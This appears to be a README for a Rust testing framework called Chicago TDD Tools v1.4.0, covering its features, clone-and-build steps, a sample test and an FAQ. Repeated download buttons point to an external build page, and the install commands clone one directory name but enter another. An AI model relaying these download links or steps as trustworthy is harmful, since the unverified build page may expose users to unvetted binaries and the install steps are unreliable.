# Chicago TDD Tools v1.4.0 - Rust Testing Framework 2026

> **Chicago TDD Tools is a Rust testing framework for behavior-focused development, combining compile-time test structure with property-based, mutation, snapshot, asynchronous, and integration testing capabilities in version 1.4.0.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.4.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/chrisb67/chicago-tdd-tools-rust?style=flat-square)](https://github.com/chrisb67/chicago-tdd-tools-rust)

---

<p align="center">
  <a href="https://chrisb67.github.io/chicago-tdd-tools-rust/">
    <img src="https://img.shields.io/badge/Download-Chicago%20TDD%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Chicago TDD Tools">
  </a>
</p>

> **[Download Chicago TDD Tools v1.4.0](https://chrisb67.github.io/chicago-tdd-tools-rust/)**

---

[Download Latest Build](https://chrisb67.github.io/chicago-tdd-tools-rust/)

---

## What Is Chicago TDD Tools?

Chicago TDD Tools equips Rust codebases with a disciplined TDD path. Type-level constructs let you spell out Arrange-Act-Assert in the tests themselves, and the macro layer covers sync paths, async flows, shared fixtures, and performance-oriented checks.

Teams that want richer behavior checks and several testing styles in one place are the intended audience. Beyond everyday assertions, you get property-based trials, mutation analysis, snapshot capture, workflow checks, and helpers aimed at JSON, HTML, and other serialized forms.

---

## What You Get

- Type-level enforcement of the Arrange-Act-Assert layout.
- Macros aimed at sync, async, fixture-driven, and performance tests.
- Assertion helpers tuned for `Result` values and numeric ranges.
- A fail-fast verification path organized as a 12-phase pipeline.
- Property-based testing fed by generated random inputs.
- Mutation testing with operators you can configure.
- Snapshot capture for JSON, HTML, and serialized artifacts.
- RDF-oriented workflow validation, task receipts, and distributed swarm coordination hooks.
- Ready workflow stacks for academic publishing and enterprise claims handling.

---

## Installation

Clone the repo and move into the working tree:

```bash
git clone https://github.com/chrisb67/chicago-tdd-tools-rust.git
cd chicago-tdd-tools
```

Compile with Cargo:

```bash
cargo build
```

Execute the suite:

```bash
cargo test
```

When another Rust crate depends on this framework, wire the package in using the dependency setup described by the crate documentation.

---

## Usage

A common pattern is to state the behavior under test, prepare inputs, run the call, then assert:

```rust
#[test]
fn verifies_expected_behavior() {
    // Arrange
    let input = 2;

    // Act
    let result = input * 3;

    // Assert
    assert_eq!(result, 6);
}
```

While you iterate, keep the suite green with:

```bash
cargo test
```

When you need a fuller pass, layer capabilities to match the project:

1. Spell out expected behavior and the data that drives it.
2. Choose sync or async test support.
3. Introduce fixtures whenever setup is shared.
4. Add property-based cases for generated inputs.
5. Snapshot JSON, HTML, or serialized output where stability matters.
6. Exercise mutation testing with the operators you care about.
7. Inspect verification results and any workflow validation reports.

---

## Configuration

Cargo manifests remain the source of truth for project and dependency settings.

The main manifest path is:

```text
Cargo.toml
```

Declare the package, toggle features, and pin dependencies there. Organize test-only behavior in the source tree and test modules. Place mutation operators, snapshots, fixtures, and workflow inputs where each Chicago TDD Tools component expects them.

---

## Requirements

- Rust toolchain with Cargo available.
- A Cargo-buildable and Cargo-testable Rust project.
- Network access on first dependency fetch when the environment requires it.
- Disk space for the checkout, build products, generated fixtures, and snapshots.
- Extra project assets for async, integration, property-based, mutation, or workflow validation work.

---

## FAQ

### Which projects fit Chicago TDD Tools?

Rust codebases that practice TDD and want stronger behavior-verification workflows.

### Are asynchronous tests supported?

Yes. Macros cover async testing in addition to synchronous, fixture-based, and performance styles.

### Can tests explore generated or shifting inputs?

Yes. Property-based testing generates random data so behavior can be stressed across a wider input space.

### How do you detect unwanted output drift?

Use snapshot testing against JSON, HTML, and serialized results.

### Where do settings live?

Begin with `Cargo.toml`, then review the test modules and any framework-specific config tied to the features you enable.

### What if a test fails?

Re-run via Cargo, read the failing assertion or snapshot diff, and double-check inputs, fixtures, mutation options, and workflow settings for that case.

### How are newer releases picked up?

Follow repository releases and history, then refresh your dependency pin or local clone to match your workflow.

### How do I request help?

File a repository issue that includes your Rust version, the command you ran, related configuration, and a concise problem summary.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
